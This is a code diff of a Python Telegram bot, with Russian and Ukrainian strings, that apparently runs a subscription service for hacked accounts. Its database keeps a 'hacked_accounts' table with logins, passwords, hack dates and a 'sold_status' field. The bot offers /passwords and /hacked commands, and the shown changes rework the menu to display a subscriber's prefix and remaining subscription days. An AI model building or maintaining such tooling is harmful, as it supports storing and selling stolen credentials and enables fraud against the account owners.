@@ -42,7 +42,7 @@ def init_db():
                  (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
     c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                  (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
-    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
+    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()  # 10 років для Создателя
     c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
               "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
               (ADMIN_CHAT_ID, "Создатель", subscription_end, "Создатель", subscription_end))
@@ -197,7 +197,14 @@ def menu_cmd(message):
     if access:
         bot.reply_to(message, access)
         return
-    bot.reply_to(message, "🧾 Команды: /start, /menu, /site, /getchatid, /passwords, /hacked, /database, /admin, /techstop, /adprefix, /delprefix")
+    user = get_user(chat_id)
+    if user:
+        time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
+        time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
+        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
+    else:
+        response = "🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['site'])
 def site_cmd(message):
